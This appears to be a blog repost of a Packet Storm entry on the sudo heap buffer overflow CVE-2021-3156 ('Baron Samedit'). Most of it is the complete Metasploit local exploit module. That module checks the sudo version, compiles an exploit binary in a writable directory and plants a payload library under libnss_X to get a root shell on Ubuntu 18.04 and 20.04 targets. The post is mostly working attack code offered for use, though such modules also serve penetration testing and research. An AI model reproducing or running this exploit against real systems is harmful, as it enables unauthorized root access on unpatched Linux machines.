---
layout: post
title: Sudo 1.8.31p2 / 1.9.5p1 Buffer Overflow
date: 2021-02-17 04:17 +0300
categories: [Exploits, Overflow]
tags: [exploits]
---









![](../../../assets/img/Exploits/sudo.png)

There is a vulnerability in the sudo command line utility that allows a local attacker to gain elevated privileges through a heap based buffer overflow. The vulnerability was introduced in July 2011 and affects version 1.8.2 through 1.8.31p2, as well as 1.9.0 through 1.9.5p1 in their default configurations. By exploiting the overflow, the attacker can overwrite a service\_user struct in memory and reference a library under their control, which will then be loaded with the elevated privileges held by sudo.

  

```MD5 | 5a520123546e73d450b7fef8df23c9de```

```perl
    ##
    # This module requires Metasploit: https://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    class MetasploitModule < Msf::Exploit::Local
      Rank = ExcellentRanking
    
      prepend Msf::Exploit::Remote::AutoCheck
      include Msf::Post::File
      include Msf::Post::Unix
      include Msf::Post::Linux::Compile
      include Msf::Post::Linux::System
      include Msf::Exploit::EXE
      include Msf::Exploit::FileDropper
    
      def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => 'Sudo Heap-Based Buffer Overflow',
            'Description'    => %q(
              A heap based buffer overflow exists in the sudo command line utility that can be exploited by a local attacker
              to gain elevated privileges. The vulnerability was introduced in July of 2011 and affects version 1.8.2
              through 1.8.31p2 as well as 1.9.0 through 1.9.5p1 in their default configurations. The technique used by this
              implementation leverages the overflow to overwrite a service_user struct in memory to reference an attacker
              controlled library which results in it being loaded with the elevated privileges held by sudo.
            ),
            'License'        => MSF_LICENSE,
            'Author'         =>
              [
                'Qualys',                            # vulnerability discovery and analysis
                'Spencer McIntyre',                  # metasploit module
                'bwatters-r7',                       # metasploit module
                'blasty <blasty@fail0verflow.com>',  # original PoC
                'Alexander Krog'                     # detailed vulnerability analysis and exploit technique
              ],
            'SessionTypes'   => ['shell', 'meterpreter'],
            'Platform'       => ['unix', 'linux'],
            'References'     => [
              ['URL', 'https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit'],
              ['URL', 'https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt'],
              ['URL', 'https://www.kalmarunionen.dk/writeups/sudo/'],
              ['URL', 'https://github.com/blasty/CVE-2021-3156/blob/main/hax.c'],
              ['CVE', '2021-3156'],
            ],
            'Targets'        =>
              [
                [ 'Manual', { } ],
                [ 'Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)', { lengths: [ 56, 54, 63, 200 ] } ],
                [ 'Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)', { lengths: [ 56, 54, 63, 212 ] } ],
              ],
            'DefaultTarget'  => 1,
            'Arch'           => ARCH_X64,
            'DefaultOptions' => { 'PrependSetgid' => true, 'PrependSetuid' => true, 'WfsDelay' => 10 },
            'DisclosureDate' => '2021-01-26',
            'Notes' => {
              'AKA'         => [ 'Baron Samedit' ],
              'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
              'Reliability' => [REPEATABLE_SESSION]
            }
          )
        )
    
        register_options([
          OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])
        ])
    
        register_advanced_options([
          OptString.new('Lengths', [ false, 'The lengths to set as used by the manual target. (format: #,#,#,#)' ], regex: /(\d+(,[ ]*| )){3}\d+/)
        ])
    
        deregister_options('COMPILE')
      end
    
      def get_versions
        versions = {}
        output = cmd_exec("sudo --version")
        if output
          version = output.split("\n").first.split(' ').last
          versions[:sudo] = version if version =~ /^\d/
        end
    
        versions
      end
    
      def check
        sudo_version = get_versions[:sudo]
        return CheckCode::Unknown('Could not identify the version of sudo.') if sudo_version.nil?
    
        # fixup the p number used by sudo to be compatible with Gem::Version
        sudo_version.gsub!(/p/, '.')
    
        vuln_builds = [
          [Gem::Version.new('1.8.2'), Gem::Version.new('1.8.31.2')],
          [Gem::Version.new('1.9.0'), Gem::Version.new('1.9.5.1')],
        ]
    
        if sudo_version == '1.8.31'
          # Ubuntu patched it as version 1.8.31-1ubuntu1.2 which is reported as 1.8.31
          return CheckCode::Detected("sudo #{sudo_version} maybe a vulnerable build.")
        end
    
        if vuln_builds.any? { |build_range| Gem::Version.new(sudo_version).between?(*build_range) }
          return CheckCode::Appears("sudo #{sudo_version} is a vulnerable build.")
        end
    
        CheckCode::Safe("sudo #{sudo_version} is not a vulnerable build.")
      end
    
      def upload(path, data)
        print_status "Writing '#{path}' (#{data.size} bytes) ..."
        write_file path, data
      end
    
      def exploit
        if target.name == 'Manual'
          fail_with(Failure::BadConfig, 'The "Lengths" advanced option must be specified for the manual target') if datastore['Lengths'].blank?
          arguments = datastore['Lengths'].gsub(/,/, ' ').gsub(/  +/, ' ')
        else
          arguments = target[:lengths].join(' ')
        end
    
        fail_with(Failure::NotFound, 'The gcc binary was not found') unless has_gcc?
    
        path = datastore['WritableDir']
        cmd_exec("mkdir -p #{path}/libnss_X")
    
        file_name = rand_text_alphanumeric(5..10)
        upload_and_compile("#{path}/#{file_name}", exploit_data('CVE-2021-3156', 'exploit.c'), '-lutil')
        upload("#{path}/libnss_X/P0P_SH3LLZ_ .so.2", generate_payload_dll)
        cmd_exec("#{path}/#{file_name} #{arguments}")
      end
    end
```

<br>

  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)